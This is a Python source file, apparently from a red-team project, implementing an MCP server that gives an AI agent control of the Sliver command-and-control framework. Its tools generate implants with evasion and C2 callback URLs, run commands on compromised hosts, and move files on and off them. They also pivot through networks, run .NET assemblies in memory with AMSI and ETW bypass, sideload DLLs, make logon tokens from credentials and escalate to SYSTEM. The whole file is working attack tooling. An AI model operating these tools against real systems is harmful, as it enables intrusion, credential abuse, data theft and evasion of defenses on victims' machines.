"""MCP server providing gRPC integration with the Sliver C2 framework.

Provides tools for session management, command execution, file transfer,
implant generation, listener management, pivoting, and post-exploitation
through Sliver's gRPC API with mTLS authentication.

Usage:
    uv run python server.py
"""

from __future__ import annotations

import base64
import json
import time
from datetime import datetime, timezone
from pathlib import Path

from mcp.server.fastmcp import FastMCP

from connection import get_protos, get_stub

_PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent

mcp = FastMCP(
    "red-run-sliver-server",
    instructions=(
        "Provides gRPC integration with the Sliver C2 framework. Use sliver_sessions "
        "to list implants, sliver_execute to run commands on compromised hosts, and "
        "sliver_generate to create new implants. Supports session management, file "
        "transfer, pivoting, port forwarding, and post-exploitation (execute-assembly, "
        "sideload, make-token, get-system)."
    ),
)


def _evidence_dir() -> Path | None:
    """Return engagement evidence directory if it exists."""
    d = _PROJECT_ROOT / "engagement" / "evidence"
    return d if d.exists() else None


def _error(msg: str) -> dict:
    """Return a standardized error dict."""
    return {"error": msg}


def _session_request(session_id: str):
    """Build a commonpb.Request with the given session ID."""
    _, _, commonpb = get_protos()
    return commonpb.Request(SessionID=session_id, Timeout=60)


def _check_response_error(response) -> str | None:
    """Check if a Sliver response has an error. Returns error string or None."""
    if hasattr(response, "Response") and response.Response:
        resp = response.Response
        if hasattr(resp, "Err") and resp.Err:
            return resp.Err
    return None


def _timestamp_to_str(ts: int) -> str:
    """Convert a Unix timestamp (seconds) to ISO format string."""
    if ts <= 0:
        return ""
    try:
        return datetime.fromtimestamp(ts, tz=timezone.utc).isoformat()
    except (OSError, ValueError):
        return str(ts)


# ---------------------------------------------------------------------------
# Tier 1 — Core Operations
# ---------------------------------------------------------------------------


@mcp.tool()
def sliver_sessions() -> list[dict]:
    """List all active Sliver sessions.

    Returns session metadata including ID, hostname, OS, username,
    remote address, and transport type. Use session IDs from this
    list with other sliver_* tools.
    """
    try:
        stub = get_stub()
        clientpb, _, commonpb = get_protos()
        response = stub.GetSessions(commonpb.Empty())
        sessions = []
        for s in response.Sessions:
            sessions.append({
                "session_id": s.ID,
                "name": s.Name,
                "hostname": s.Hostname,
                "uuid": s.UUID,
                "username": s.Username,
                "uid": s.UID,
                "gid": s.GID,
                "os": s.OS,
                "arch": s.Arch,
                "transport": s.Transport,
                "remote_address": s.RemoteAddress,
                "pid": s.PID,
                "filename": s.Filename,
                "last_checkin": _timestamp_to_str(s.LastCheckin),
                "active_c2": s.ActiveC2,
                "reconnect_interval": s.ReconnectInterval,
                "proxy_url": s.ProxyURL,
            })
        return sessions
    except Exception as e:
        return [_error(f"Failed to list sessions: {e}")]


@mcp.tool()
def sliver_execute(
    session_id: str,
    exe: str,
    args: list[str] | None = None,
    output: bool = True,
) -> dict:
    """Execute a command on a Sliver session.

    Runs an executable on the target host through the Sliver implant.
    Returns stdout, stderr, and exit status.

    Args:
        session_id: Target session ID (from sliver_sessions).
        exe: Path to executable or command name (e.g., "whoami",
             "C:\\\\Windows\\\\System32\\\\cmd.exe").
        args: Command arguments as a list (e.g., ["/c", "dir"]).
        output: Capture stdout/stderr (default True).
    """
    try:
        stub = get_stub()
        _, sliverpb, _ = get_protos()
        request = sliverpb.ExecuteReq(
            Path=exe,
            Args=args or [],
            Output=output,
            Request=_session_request(session_id),
        )
        response = stub.Execute(request)
        err = _check_response_error(response)
        if err:
            return _error(err)
        result = {
            "status": response.Status,
            "stdout": response.Stdout.decode(errors="replace") if response.Stdout else "",
            "stderr": response.Stderr.decode(errors="replace") if response.Stderr else "",
            "pid": response.Pid,
        }
        return result
    except Exception as e:
        return _error(f"Execute failed: {e}")


@mcp.tool()
def sliver_upload(
    session_id: str,
    local_path: str,
    remote_path: str,
) -> dict:
    """Upload a file from the attackbox to a Sliver session target.

    Reads the local file and transfers it to the remote path on the
    target through the Sliver implant.

    Args:
        session_id: Target session ID.
        local_path: Path to file on the attackbox.
        remote_path: Destination path on the target.
    """
    try:
        local = Path(local_path).expanduser()
        if not local.is_file():
            return _error(f"Local file not found: {local_path}")

        data = local.read_bytes()
        stub = get_stub()
        _, sliverpb, _ = get_protos()
        request = sliverpb.UploadReq(
            Path=remote_path,
            Data=data,
            IsIOC=False,
            Request=_session_request(session_id),
        )
        response = stub.Upload(request)
        err = _check_response_error(response)
        if err:
            return _error(err)
        return {
            "path": response.Path,
            "size": len(data),
            "message": f"Uploaded {len(data)} bytes to {response.Path}",
        }
    except Exception as e:
        return _error(f"Upload failed: {e}")


@mcp.tool()
def sliver_download(
    session_id: str,
    remote_path: str,
    local_path: str,
) -> dict:
    """Download a file from a Sliver session target to the attackbox.

    Retrieves a file from the target and saves it locally. If an
    engagement evidence directory exists, also logs the download.

    Args:
        session_id: Target session ID.
        remote_path: Path to file on the target.
        local_path: Destination path on the attackbox.
    """
    try:
        stub = get_stub()
        _, sliverpb, _ = get_protos()
        request = sliverpb.DownloadReq(
            Path=remote_path,
            Request=_session_request(session_id),
        )
        response = stub.Download(request)
        err = _check_response_error(response)
        if err:
            return _error(err)

        if not response.Data:
            return _error(f"No data received for {remote_path}")

        local = Path(local_path).expanduser()
        local.parent.mkdir(parents=True, exist_ok=True)
        local.write_bytes(response.Data)

        return {
            "path": str(local),
            "remote_path": remote_path,
            "size": len(response.Data),
            "encoder": response.Encoder,
            "exists": response.Exists,
            "message": f"Downloaded {len(response.Data)} bytes from {remote_path}",
        }
    except Exception as e:
        return _error(f"Download failed: {e}")


@mcp.tool()
def sliver_ls(session_id: str, path: str) -> dict:
    """List files in a directory on a Sliver session target.

    Args:
        session_id: Target session ID.
        path: Directory path to list on the target.
    """
    try:
        stub = get_stub()
        _, sliverpb, _ = get_protos()
        request = sliverpb.LsReq(
            Path=path,
            Request=_session_request(session_id),
        )
        response = stub.Ls(request)
        err = _check_response_error(response)
        if err:
            return _error(err)

        files = []
        for f in response.Files:
            files.append({
                "name": f.Name,
                "is_dir": f.IsDir,
                "size": f.Size,
                "mode": f.Mode,
                "mod_time": _timestamp_to_str(f.ModTime),
                "link": f.Link if f.Link else None,
            })
        return {
            "path": response.Path,
            "exists": response.Exists,
            "files": files,
        }
    except Exception as e:
        return _error(f"Ls failed: {e}")


@mcp.tool()
def sliver_ps(session_id: str) -> list[dict]:
    """List running processes on a Sliver session target.

    Args:
        session_id: Target session ID.
    """
    try:
        stub = get_stub()
        _, sliverpb, _ = get_protos()
        request = sliverpb.PsReq(
            Request=_session_request(session_id),
        )
        response = stub.Ps(request)
        err = _check_response_error(response)
        if err:
            return [_error(err)]

        processes = []
        for p in response.Processes:
            processes.append({
                "pid": p.Pid,
                "ppid": p.Ppid,
                "executable": p.Executable,
                "owner": p.Owner,
                "architecture": p.Architecture,
                "session_id": p.SessionID if p.SessionID else None,
                "cmdline": list(p.CmdLine) if p.CmdLine else [],
            })
        return processes
    except Exception as e:
        return [_error(f"Ps failed: {e}")]


@mcp.tool()
def sliver_ifconfig(session_id: str) -> list[dict]:
    """List network interfaces on a Sliver session target.

    Args:
        session_id: Target session ID.
    """
    try:
        stub = get_stub()
        _, sliverpb, _ = get_protos()
        request = sliverpb.IfconfigReq(
            Request=_session_request(session_id),
        )
        response = stub.Ifconfig(request)
        err = _check_response_error(response)
        if err:
            return [_error(err)]

        interfaces = []
        for iface in response.NetInterfaces:
            addrs = []
            if hasattr(iface, "IPAddresses"):
                for addr in iface.IPAddresses:
                    addrs.append(addr)
            interfaces.append({
                "index": iface.Index,
                "name": iface.Name,
                "mac": iface.MAC,
                "ip_addresses": addrs,
            })
        return interfaces
    except Exception as e:
        return [_error(f"Ifconfig failed: {e}")]


@mcp.tool()
def sliver_netstat(session_id: str) -> list[dict]:
    """List network connections on a Sliver session target.

    Args:
        session_id: Target session ID.
    """
    try:
        stub = get_stub()
        _, sliverpb, _ = get_protos()
        request = sliverpb.NetstatReq(
            TCP=True,
            UDP=True,
            IP4=True,
            IP6=True,
            Listening=True,
            Request=_session_request(session_id),
        )
        response = stub.Netstat(request)
        err = _check_response_error(response)
        if err:
            return [_error(err)]

        entries = []
        for e in response.Entries:
            entries.append({
                "local_addr": f"{e.LocalAddr.Ip}:{e.LocalAddr.Port}" if e.LocalAddr else "",
                "remote_addr": f"{e.RemoteAddr.Ip}:{e.RemoteAddr.Port}" if e.RemoteAddr else "",
                "protocol": e.Protocol,
                "state": e.SkState,
                "pid": e.Pid,
                "process": e.Process.Executable if e.Process else "",
            })
        return entries
    except Exception as e:
        return [_error(f"Netstat failed: {e}")]


# ---------------------------------------------------------------------------
# Tier 2 — Implant Generation & Listeners
# ---------------------------------------------------------------------------


@mcp.tool()
def sliver_generate(
    os: str,
    arch: str,
    format: str = "exe",
    c2_endpoints: list[str] | None = None,
    name: str | None = None,
    debug: bool = False,
    evasion: bool = False,
) -> dict:
    """Generate a Sliver implant binary.

    Creates a new implant configured with the specified parameters.
    The generated binary is saved to the engagement evidence directory
    if available, otherwise to the current directory.

    Args:
        os: Target OS — "windows", "linux", or "darwin".
        arch: Target architecture — "amd64" or "386".
        format: Output format — "exe", "shared" (DLL/SO), or "shellcode".
        c2_endpoints: C2 callback URLs (e.g., ["mtls://192.168.1.100:8888"]).
                     If not specified, uses the server's default listener.
        name: Implant name (auto-generated if not specified).
        debug: Include debug information in the implant.
        evasion: Enable evasion features (process injection, obfuscation).
    """
    try:
        stub = get_stub()
        clientpb, _, _ = get_protos()

        # Map string format to protobuf enum
        format_map = {
            "exe": clientpb.OutputFormat.EXECUTABLE,
            "shared": clientpb.OutputFormat.SHARED_LIB,
            "shellcode": clientpb.OutputFormat.SHELLCODE,
            "service": clientpb.OutputFormat.SERVICE,
        }
        output_format = format_map.get(format)
        if output_format is None:
            return _error(f"Unknown format '{format}'. Use: exe, shared, shellcode, service")

        # Build C2 config
        c2_list = []
        if c2_endpoints:
            for endpoint in c2_endpoints:
                c2_list.append(clientpb.ImplantC2(
                    URL=endpoint,
                    Priority=0,
                ))

        # Build implant config
        config = clientpb.ImplantConfig(
            GOOS=os,
            GOARCH=arch,
            Name=name or "",
            Debug=debug,
            Evasion=evasion,
            Format=output_format,
            IsSession=True,
            C2=c2_list,
        )

        request = clientpb.GenerateReq(Config=config)

        # Generation can take a while — use longer timeout
        response = stub.Generate(request, timeout=600)

        if not response.File or not response.File.Data:
            return _error("Generation returned empty file")

        # Determine save path
        evidence = _evidence_dir()
        implant_name = response.File.Name or name or f"implant-{os}-{arch}"
        if evidence:
            save_path = evidence / implant_name
        else:
            save_path = Path.cwd() / implant_name

        save_path.parent.mkdir(parents=True, exist_ok=True)
        save_path.write_bytes(response.File.Data)
        # Make executable
        if os in ("linux", "darwin") and format == "exe":
            save_path.chmod(0o755)

        return {
            "name": implant_name,
            "path": str(save_path),
            "size": len(response.File.Data),
            "os": os,
            "arch": arch,
            "format": format,
            "message": f"Implant saved to {save_path} ({len(response.File.Data)} bytes)",
        }
    except Exception as e:
        return _error(f"Generate failed: {e}")


@mcp.tool()
def sliver_listeners() -> list[dict]:
    """List all active Sliver listeners (jobs).

    Returns listener metadata including type, bind address, port,
    and job ID (used with sliver_stop_listener).
    """
    try:
        stub = get_stub()
        _, _, commonpb = get_protos()
        response = stub.GetJobs(commonpb.Empty())
        jobs = []
        for j in response.Active:
            jobs.append({
                "job_id": j.ID,
                "name": j.Name,
                "description": j.Description,
                "protocol": j.Protocol,
                "port": j.Port,
                "domains": list(j.Domains) if j.Domains else [],
            })
        return jobs
    except Exception as e:
        return [_error(f"Failed to list listeners: {e}")]


@mcp.tool()
def sliver_start_listener(
    type: str = "mtls",
    host: str = "0.0.0.0",
    port: int = 8888,
) -> dict:
    """Start a Sliver listener (mTLS, HTTPS, or HTTP).

    Creates a new listener job on the Sliver server that implants
    can connect back to.

    Args:
        type: Listener type — "mtls", "https", or "http".
        host: Bind address (default "0.0.0.0").
        port: Listen port (default 8888).
    """
    try:
        stub = get_stub()
        clientpb, _, _ = get_protos()

        if type == "mtls":
            request = clientpb.MTLSListenerReq(
                Host=host,
                Port=port,
            )
            response = stub.StartMTLSListener(request)
        elif type == "https":
            request = clientpb.HTTPListenerReq(
                Host=host,
                Port=port,
                Secure=True,
            )
            response = stub.StartHTTPSListener(request)
        elif type == "http":
            request = clientpb.HTTPListenerReq(
                Host=host,
                Port=port,
                Secure=False,
            )
            response = stub.StartHTTPListener(request)
        else:
            return _error(f"Unknown listener type '{type}'. Use: mtls, https, http")

        return {
            "job_id": response.JobID,
            "type": type,
            "host": host,
            "port": port,
            "message": f"{type.upper()} listener started on {host}:{port} (job {response.JobID})",
        }
    except Exception as e:
        return _error(f"Failed to start {type} listener: {e}")


@mcp.tool()
def sliver_stop_listener(job_id: int) -> dict:
    """Stop a Sliver listener by job ID.

    Args:
        job_id: Job ID from sliver_listeners or sliver_start_listener.
    """
    try:
        stub = get_stub()
        clientpb, _, _ = get_protos()
        request = clientpb.KillJobReq(ID=job_id)
        response = stub.KillJob(request)
        return {
            "job_id": job_id,
            "success": response.Success,
            "message": f"Listener job {job_id} stopped" if response.Success else f"Failed to stop job {job_id}",
        }
    except Exception as e:
        return _error(f"Failed to stop listener: {e}")


# ---------------------------------------------------------------------------
# Tier 3 — Pivoting & Routing
# ---------------------------------------------------------------------------


@mcp.tool()
def sliver_pivot_start(
    session_id: str,
    type: str = "tcp",
    bind_address: str = "0.0.0.0:1234",
) -> dict:
    """Start a pivot listener on a Sliver session.

    Creates a pivot listener on the compromised host that other
    implants can connect through, enabling network pivoting.

    Args:
        session_id: Session to start the pivot on.
        type: Pivot type — "tcp" or "named-pipe" (Windows only).
        bind_address: Address and port to bind on the target
                     (default "0.0.0.0:1234").
    """
    try:
        stub = get_stub()
        _, sliverpb, _ = get_protos()
        clientpb, _, _ = get_protos()

        # Map type string to protobuf enum
        type_map = {
            "tcp": clientpb.PivotType.TCP,
            "named-pipe": clientpb.PivotType.NamedPipe,
        }
        pivot_type = type_map.get(type)
        if pivot_type is None:
            return _error(f"Unknown pivot type '{type}'. Use: tcp, named-pipe")

        request = sliverpb.PivotStartListenerReq(
            Type=pivot_type,
            BindAddress=bind_address,
            Request=_session_request(session_id),
        )
        response = stub.PivotStartListener(request)
        err = _check_response_error(response)
        if err:
            return _error(err)

        return {
            "listener_id": response.ID,
            "type": type,
            "bind_address": bind_address,
            "session_id": session_id,
            "message": f"Pivot {type} listener started on {bind_address}",
        }
    except Exception as e:
        return _error(f"Failed to start pivot: {e}")


@mcp.tool()
def sliver_pivot_stop(session_id: str, listener_id: int) -> dict:
    """Stop a pivot listener on a Sliver session.

    Args:
        session_id: Session the pivot is running on.
        listener_id: Pivot listener ID from sliver_pivot_start.
    """
    try:
        stub = get_stub()
        _, sliverpb, _ = get_protos()
        request = sliverpb.PivotStopListenerReq(
            ID=listener_id,
            Request=_session_request(session_id),
        )
        response = stub.PivotStopListener(request)
        err = _check_response_error(response)
        if err:
            return _error(err)

        return {
            "listener_id": listener_id,
            "session_id": session_id,
            "message": f"Pivot listener {listener_id} stopped",
        }
    except Exception as e:
        return _error(f"Failed to stop pivot: {e}")


@mcp.tool()
def sliver_pivot_graph() -> dict:
    """Get the Sliver pivot graph showing implant routing topology.

    Returns the graph of pivot connections between implants,
    showing which sessions route through which pivots.
    """
    try:
        stub = get_stub()
        _, _, commonpb = get_protos()
        response = stub.PivotGraph(commonpb.Empty())

        nodes = []
        for child in response.Children:
            node = {
                "session_id": child.Session.ID if child.Session else "",
                "name": child.Session.Name if child.Session else "",
                "hostname": child.Session.Hostname if child.Session else "",
                "children": [],
            }
            # Recursively collect pivot children
            _collect_pivot_children(child, node["children"])
            nodes.append(node)

        return {
            "nodes": nodes,
            "message": f"Pivot graph has {len(nodes)} root node(s)",
        }
    except Exception as e:
        return _error(f"Failed to get pivot graph: {e}")


def _collect_pivot_children(parent_node, children_list: list) -> None:
    """Recursively collect pivot graph children."""
    if not hasattr(parent_node, "Children"):
        return
    for child in parent_node.Children:
        entry = {
            "session_id": child.Session.ID if child.Session else "",
            "name": child.Session.Name if child.Session else "",
            "hostname": child.Session.Hostname if child.Session else "",
            "children": [],
        }
        _collect_pivot_children(child, entry["children"])
        children_list.append(entry)


@mcp.tool()
def sliver_socks_start(session_id: str, port: int = 1080) -> dict:
    """Start a SOCKS5 proxy through a Sliver session.

    Creates a local SOCKS5 proxy that tunnels traffic through the
    target implant. Use with proxychains or browser SOCKS settings.

    Args:
        session_id: Session to route traffic through.
        port: Local SOCKS5 port (default 1080).
    """
    try:
        stub = get_stub()
        _, sliverpb, _ = get_protos()
        request = sliverpb.Socks(
            SessionID=session_id,
            Port=port,
        )
        response = stub.CreateSocks(request)

        return {
            "session_id": session_id,
            "port": port,
            "tunnel_id": response.TunnelID if hasattr(response, "TunnelID") else 0,
            "message": f"SOCKS5 proxy started on 127.0.0.1:{port} via session {session_id[:8]}",
        }
    except Exception as e:
        return _error(f"Failed to start SOCKS proxy: {e}")


@mcp.tool()
def sliver_socks_stop(session_id: str) -> dict:
    """Stop the SOCKS5 proxy on a Sliver session.

    Args:
        session_id: Session with the active SOCKS proxy.
    """
    try:
        stub = get_stub()
        _, sliverpb, _ = get_protos()
        request = sliverpb.Socks(
            SessionID=session_id,
        )
        response = stub.CloseSocks(request)

        return {
            "session_id": session_id,
            "message": f"SOCKS proxy stopped on session {session_id[:8]}",
        }
    except Exception as e:
        return _error(f"Failed to stop SOCKS proxy: {e}")


@mcp.tool()
def sliver_portfwd_start(
    session_id: str,
    remote_host: str,
    remote_port: int,
    local_port: int | None = None,
) -> dict:
    """Start a port forward through a Sliver session.

    Forwards a local port to a remote host:port accessible from
    the target. Useful for reaching internal services.

    Args:
        session_id: Session to route through.
        remote_host: Target host reachable from the session (e.g., "10.0.0.5").
        remote_port: Target port (e.g., 445, 3389).
        local_port: Local listen port (defaults to remote_port).
    """
    try:
        stub = get_stub()
        _, sliverpb, _ = get_protos()
        clientpb, _, _ = get_protos()

        effective_local_port = local_port if local_port is not None else remote_port

        request = sliverpb.PortfwdReq(
            Port=effective_local_port,
            Host="127.0.0.1",
            RemoteHost=remote_host,
            RemotePort=remote_port,
            Request=_session_request(session_id),
        )
        response = stub.Portfwd(request)
        err = _check_response_error(response)
        if err:
            return _error(err)

        return {
            "forward_id": response.ID if hasattr(response, "ID") else 0,
            "local": f"127.0.0.1:{effective_local_port}",
            "remote": f"{remote_host}:{remote_port}",
            "session_id": session_id,
            "message": f"Port forward: 127.0.0.1:{effective_local_port} -> {remote_host}:{remote_port} via {session_id[:8]}",
        }
    except Exception as e:
        return _error(f"Failed to start port forward: {e}")


@mcp.tool()
def sliver_portfwd_stop(session_id: str, forward_id: int) -> dict:
    """Stop a port forward on a Sliver session.

    Args:
        session_id: Session with the active port forward.
        forward_id: Forward ID from sliver_portfwd_start.
    """
    try:
        stub = get_stub()
        _, sliverpb, _ = get_protos()

        request = sliverpb.PortfwdReq(
            ID=forward_id,
            Request=_session_request(session_id),
        )
        response = stub.PortfwdRm(request)
        err = _check_response_error(response)
        if err:
            return _error(err)

        return {
            "forward_id": forward_id,
            "session_id": session_id,
            "message": f"Port forward {forward_id} stopped",
        }
    except Exception as e:
        return _error(f"Failed to stop port forward: {e}")


# ---------------------------------------------------------------------------
# Tier 4 — Post-Exploitation
# ---------------------------------------------------------------------------


@mcp.tool()
def sliver_execute_assembly(
    session_id: str,
    assembly_path: str,
    args: str = "",
    process: str = "notepad.exe",
    am_si_bypass: bool = True,
    etw_bypass: bool = True,
) -> dict:
    """Execute a .NET assembly in-memory on a Sliver session target.

    Loads and executes a .NET assembly (e.g., Rubeus, Seatbelt,
    SharpHound) reflectively in a sacrificial process. Supports
    AMSI and ETW bypass for evasion.

    Args:
        session_id: Target session ID.
        assembly_path: Local path to the .NET assembly (.exe).
        args: Arguments to pass to the assembly (space-separated string).
        process: Sacrificial process to inject into (default "notepad.exe").
        am_si_bypass: Bypass AMSI before loading (default True).
        etw_bypass: Bypass ETW tracing (default True).
    """
    try:
        assembly = Path(assembly_path).expanduser()
        if not assembly.is_file():
            return _error(f"Assembly not found: {assembly_path}")

        assembly_data = assembly.read_bytes()
        stub = get_stub()
        _, sliverpb, _ = get_protos()
        clientpb, _, _ = get_protos()

        request = clientpb.ExecuteAssemblyReq(
            Assembly=assembly_data,
            Arguments=args,
            Process=process,
            AmsiBypass=am_si_bypass,
            EtwBypass=etw_bypass,
            IsDLL=assembly_path.lower().endswith(".dll"),
            Request=_session_request(session_id),
        )
        response = stub.ExecuteAssembly(request)
        err = _check_response_error(response)
        if err:
            return _error(err)

        output = response.Output.decode(errors="replace") if response.Output else ""

        # Save output to evidence if available
        evidence = _evidence_dir()
        if evidence and output:
            ts = datetime.now().strftime("%Y%m%d-%H%M%S")
            asm_name = assembly.stem
            out_path = evidence / f"execute-assembly-{asm_name}-{ts}.txt"
            out_path.write_text(output)

        return {
            "output": output,
            "assembly": assembly.name,
            "process": process,
            "amsi_bypass": am_si_bypass,
            "etw_bypass": etw_bypass,
        }
    except Exception as e:
        return _error(f"Execute-assembly failed: {e}")


@mcp.tool()
def sliver_sideload(
    session_id: str,
    dll_path: str,
    entry_point: str = "",
    process: str = "notepad.exe",
    args: str = "",
) -> dict:
    """Sideload a shared library (DLL/SO) into a Sliver session target.

    Loads a native DLL or shared object into a sacrificial process
    and calls the specified entry point.

    Args:
        session_id: Target session ID.
        dll_path: Local path to the DLL/SO file.
        entry_point: DLL export function to call (e.g., "DllMain").
        process: Sacrificial process to inject into (default "notepad.exe").
        args: Arguments to pass to the entry point.
    """
    try:
        dll = Path(dll_path).expanduser()
        if not dll.is_file():
            return _error(f"DLL/SO not found: {dll_path}")

        dll_data = dll.read_bytes()
        stub = get_stub()
        _, sliverpb, _ = get_protos()
        clientpb, _, _ = get_protos()

        request = clientpb.SideloadReq(
            Data=dll_data,
            EntryPoint=entry_point,
            ProcessName=process,
            Args=args,
            Request=_session_request(session_id),
        )
        response = stub.Sideload(request)
        err = _check_response_error(response)
        if err:
            return _error(err)

        output = response.Result.decode(errors="replace") if response.Result else ""
        return {
            "output": output,
            "dll": dll.name,
            "entry_point": entry_point,
            "process": process,
        }
    except Exception as e:
        return _error(f"Sideload failed: {e}")


@mcp.tool()
def sliver_make_token(
    session_id: str,
    username: str,
    password: str,
    domain: str = "",
) -> dict:
    """Create a Windows logon token on a Sliver session target.

    Uses LogonUserW to create a new token with the specified
    credentials, enabling access to network resources as that user.

    Args:
        session_id: Target session ID.
        username: Username for the token.
        password: Password for the token.
        domain: Domain name (optional, use "." for local accounts).
    """
    try:
        stub = get_stub()
        _, sliverpb, _ = get_protos()
        clientpb, _, _ = get_protos()

        request = clientpb.MakeTokenReq(
            Username=username,
            Password=password,
            Domain=domain,
            Request=_session_request(session_id),
        )
        response = stub.MakeToken(request)
        err = _check_response_error(response)
        if err:
            return _error(err)

        return {
            "username": username,
            "domain": domain,
            "session_id": session_id,
            "message": f"Token created for {domain}\\{username}" if domain else f"Token created for {username}",
        }
    except Exception as e:
        return _error(f"MakeToken failed: {e}")


@mcp.tool()
def sliver_get_system(session_id: str) -> dict:
    """Attempt to elevate to SYSTEM on a Sliver session target.

    Uses Sliver's built-in privilege escalation to get SYSTEM-level
    access. Requires the implant to be running as a local admin.

    Args:
        session_id: Target session ID (must be running as local admin).
    """
    try:
        stub = get_stub()
        clientpb, _, _ = get_protos()

        request = clientpb.GetSystemReq(
            HostingProcess=clientpb.HostingProcess(
                Name="spoolsv.exe",
            ),
            Config=clientpb.ImplantConfig(
                IsSession=True,
            ),
            Request=_session_request(session_id),
        )
        response = stub.GetSystem(request)

        if hasattr(response, "Session") and response.Session:
            return {
                "session_id": response.Session.ID,
                "username": response.Session.Username,
                "hostname": response.Session.Hostname,
                "message": f"SYSTEM shell obtained — new session {response.Session.ID}",
            }
        return {
            "message": "GetSystem request sent. Check sliver_sessions() for new SYSTEM session.",
        }
    except Exception as e:
        return _error(f"GetSystem failed: {e}")


@mcp.tool()
def sliver_screenshot(session_id: str) -> dict:
    """Take a screenshot on a Sliver session target.

    Captures the target's screen and saves it to the engagement
    evidence directory.

    Args:
        session_id: Target session ID.
    """
    try:
        stub = get_stub()
        _, sliverpb, _ = get_protos()

        request = sliverpb.ScreenshotReq(
            Request=_session_request(session_id),
        )
        response = stub.Screenshot(request)
        err = _check_response_error(response)
        if err:
            return _error(err)

        if not response.Data:
            return _error("Screenshot returned no data (headless target or no display)")

        # Save to evidence directory
        ts = datetime.now().strftime("%Y%m%d-%H%M%S")
        filename = f"screenshot-{session_id[:8]}-{ts}.png"

        evidence = _evidence_dir()
        if evidence:
            save_path = evidence / filename
        else:
            save_path = Path.cwd() / filename

        save_path.parent.mkdir(parents=True, exist_ok=True)
        save_path.write_bytes(response.Data)

        return {
            "path": str(save_path),
            "size": len(response.Data),
            "session_id": session_id,
            "message": f"Screenshot saved to {save_path} ({len(response.Data)} bytes)",
        }
    except Exception as e:
        return _error(f"Screenshot failed: {e}")


# ---------------------------------------------------------------------------
# Tier 5 — Beacons
# ---------------------------------------------------------------------------


@mcp.tool()
def sliver_beacons() -> list[dict]:
    """List all active Sliver beacons.

    Beacons are asynchronous implants that check in periodically
    (unlike sessions which maintain a persistent connection). Tasks
    are queued and executed on next check-in.
    """
    try:
        stub = get_stub()
        _, _, commonpb = get_protos()
        response = stub.GetBeacons(commonpb.Empty())
        beacons = []
        for b in response.Beacons:
            beacons.append({
                "beacon_id": b.ID,
                "name": b.Name,
                "hostname": b.Hostname,
                "uuid": b.UUID,
                "username": b.Username,
                "uid": b.UID,
                "gid": b.GID,
                "os": b.OS,
                "arch": b.Arch,
                "transport": b.Transport,
                "remote_address": b.RemoteAddress,
                "pid": b.PID,
                "filename": b.Filename,
                "last_checkin": _timestamp_to_str(b.LastCheckin),
                "active_c2": b.ActiveC2,
                "interval": b.Interval,
                "jitter": b.Jitter,
                "next_checkin": _timestamp_to_str(b.NextCheckin),
            })
        return beacons
    except Exception as e:
        return [_error(f"Failed to list beacons: {e}")]


@mcp.tool()
def sliver_beacon_tasks(beacon_id: str) -> list[dict]:
    """List tasks for a Sliver beacon.

    Shows all pending and completed tasks for the specified beacon.
    Tasks are queued and executed when the beacon checks in.

    Args:
        beacon_id: Beacon ID from sliver_beacons.
    """
    try:
        stub = get_stub()
        clientpb, _, _ = get_protos()
        request = clientpb.Beacon(ID=beacon_id)
        response = stub.GetBeaconTasks(request)
        tasks = []
        for t in response.Tasks:
            tasks.append({
                "task_id": t.ID,
                "beacon_id": t.BeaconID,
                "created_at": _timestamp_to_str(t.CreatedAt),
                "state": t.State,
                "sent_at": _timestamp_to_str(t.SentAt),
                "completed_at": _timestamp_to_str(t.CompletedAt),
                "description": t.Description,
            })
        return tasks
    except Exception as e:
        return [_error(f"Failed to list beacon tasks: {e}")]


@mcp.tool()
def sliver_beacon_interactive(beacon_id: str) -> dict:
    """Open an interactive session from a Sliver beacon.

    Requests the beacon to upgrade to a full interactive session
    on its next check-in. The new session will appear in
    sliver_sessions() after the beacon checks in.

    Args:
        beacon_id: Beacon ID to upgrade.
    """
    try:
        stub = get_stub()
        clientpb, _, _ = get_protos()
        request = clientpb.Beacon(ID=beacon_id)
        response = stub.OpenSession(request)

        if hasattr(response, "ID") and response.ID:
            return {
                "session_id": response.ID,
                "beacon_id": beacon_id,
                "message": f"Interactive session opened: {response.ID}",
            }
        return {
            "beacon_id": beacon_id,
            "message": "Session upgrade requested. Will activate on next beacon check-in. "
                       "Monitor with sliver_sessions().",
        }
    except Exception as e:
        return _error(f"Failed to open interactive session: {e}")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    mcp.run()
